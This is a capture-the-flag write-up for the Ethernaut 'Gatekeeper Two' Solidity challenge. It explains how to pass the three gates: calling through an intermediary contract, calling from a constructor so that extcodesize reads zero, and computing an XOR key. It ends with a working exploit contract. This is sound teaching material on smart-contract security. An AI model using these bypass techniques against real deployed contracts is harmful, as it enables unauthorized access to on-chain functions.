![](https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg)

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.
##### Things that might help:
- Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
- The `assembly` keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See [here](http://solidity.readthedocs.io/en/v0.4.23/assembly.html) for more information. The `extcodesize` call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf).
- The `^` character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see [here](http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet)). The Coin Flip level is also a good place to start when approaching this challenge.

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

Solution:
## Analysis

### Gate One

```sol
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```

This modifier ensures that the `msg.sender` should not be equal to `tx.origin`. This is similar to [Level 04 - Telephone](https://blog.dixitaditya.com/ethernaut-level-04-telephone).

To make sure our `msg.sender` and `tx.origin` are different, we need to create an intermediary contract that will make function calls to the Gatekeeper contract. This will make our caller's address the `tx.origin` and our deployed contract's address will be the `msg.sender` as received by the Gatekeeper.

---
### Gate Two

```sol
modifier gateTwo() {
    uint x;
    assembly { 
        x := extcodesize(caller()) 
    }
    require(x == 0);
    _;
}
```

#### extcodesize:

In Solidity, we can use low-level codes by using assembly in YUL. They can be used inside `assembly {...}`. `extcodesize` is one such opcode that returns the code's size of any address.

#### caller():

This is the address of the call sender (except in the case of delegatecall).

In the modifier shown above, the variable `x` is used to store the size of the code on the `caller()`'s address, i.e., the contract which will be making a call to Gatekeeper Two's instance. We need to use another contract to make sure we pass the validation in the first gate.

The `x` variable is being checked to make sure that the size of the contract's code is 0, in other words, an [EOA](https://blog.solidityscan.com/distinguishing-eoa-and-smart-contracts-securely-911dc42fdf13) should make the call and not another contract.

So how do we satisfy both gate 1 and 2's criteria?

This is where constructor's come into play. During a contract's initialization, or when it's constructor is being called, its runtime code size will always be 0.

So when we put our exploit logic and call it from inside a constructor, the return value of `extcodesize` will always return zero. This essentially means that all our exploit code will be called from inside of our contract's constructor to go through the second gate.

---
### Gate Three

```sol
modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
}
```

This is a simple XOR operation and we know that `A XOR B = C` is equal to `A XOR C = B`. Using this logic we can very easily find the value of the unknown `_gateKey` simply by using the following code:

```sol
bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
```

Time to put everything inside our constructor.

---
## The Exploit

Here's our final [exploit code](https://github.com/az0mb13/ethernaut-foundry/blob/master/src/level14.sol):

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract LetMeInTwo {

    constructor () public {
        GatekeeperTwo level12 = GatekeeperTwo(0x1D29C74Cfb0752329d2EE8B56c5CE916FeD9ac8d);
        bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max));
        level12.enter(myKey);        
    }
}
```

Let's deploy the contract using the command. Once this is deployed, the constructor will be triggered automatically completing the instance.

___
Way to go! Now that you can get past the gatekeeper, you have what it takes to join [theCyber](https://etherscan.io/address/thecyber.eth#code), a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on [reddit](https://www.reddit.com/user/0age) or via [email](mailto:0age@protonmail.com) and use it to register with the contract at [gatekeepertwo.thecyber.eth](https://etherscan.io/address/gatekeepertwo.thecyber.eth#code) (be aware that only the first 128 entrants will be accepted by the contract).